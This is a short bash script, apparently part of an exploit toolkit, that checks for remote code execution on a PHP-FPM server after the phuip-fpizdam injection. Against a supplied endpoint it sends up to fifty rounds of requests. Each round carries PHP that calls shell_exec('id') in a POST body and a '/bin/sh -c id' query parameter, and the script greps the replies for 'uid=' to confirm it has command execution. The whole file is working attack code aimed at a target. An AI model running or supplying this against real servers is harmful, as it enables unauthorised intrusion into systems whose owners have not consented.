#!/bin/bash
# PHP-FPM — Verify RCE after phuip-fpizdam injection
# Usage: verify_rce.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

echo "[*] 验证 RCE..."
for i in $(seq 1 50); do
  result=$(curl -s -X POST "${ENDPOINT}/index.php?a=id" \
    -d "<?php echo 'FPM_RCE_' . shell_exec('id'); ?>" \
    --max-time 5 2>/dev/null)
  if echo "$result" | grep -q "uid="; then
    echo "[+] POST body 命中"
    echo "$result"
    echo "PHP_FPM_RCE_OK"
    exit 0
  fi
  result2=$(curl -s "${ENDPOINT}/index.php?a=/bin/sh+-c+id" --max-time 5 2>/dev/null)
  if echo "$result2" | grep -q "uid="; then
    echo "[+] 参数方式命中"
    echo "$result2"
    echo "PHP_FPM_RCE_OK"
    exit 0
  fi
done
echo "VERIFY_FAILED"
